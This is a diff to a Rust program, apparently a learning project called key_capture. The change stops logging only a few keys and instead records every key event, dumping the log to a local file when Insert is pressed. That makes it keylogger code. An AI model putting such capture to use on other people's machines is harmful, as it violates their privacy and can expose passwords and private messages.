@@ -16,7 +16,7 @@ fn main() -> Result<(), error_type::Errors> {
     let mut event_buffer = [0u8; std::mem::size_of::<InputEvent>()];
     let mut buffer_offset = 0;
     let mut logger =
-        logger::Logger::new("/home/anon/Documents/Code/RustLearning/key_capture/output.txt")
+        logger::Logger::new("/home/anon/Documents/Code/RustLearning/key_capture/output.txt".to_string())
             .unwrap();
 
     loop {
@@ -32,12 +32,11 @@ fn main() -> Result<(), error_type::Errors> {
             let event: InputEvent = unsafe { std::mem::transmute(event_buffer) };
 
             if event.event_type() == EventType::KEY {
-                if event.code() == Key::KEY_G.code()
-                    || event.code() == Key::KEY_LEFTALT.code()
-                    || event.code() == Key::KEY_LEFTCTRL.code()
+                if event.code() == Key::KEY_INSERT.code()
                 {
-                    logger.send_key(&event.code(), &event.value());
+                    let _ = logger.print_to_file();
                 }
+                    logger.send_key(&event.code(), &event.value());
 
                 let new_event = InputEvent::new(EventType::KEY, event.code(), event.value());
                 let new_buffer: [u8; std::mem::size_of::<InputEvent>()] =
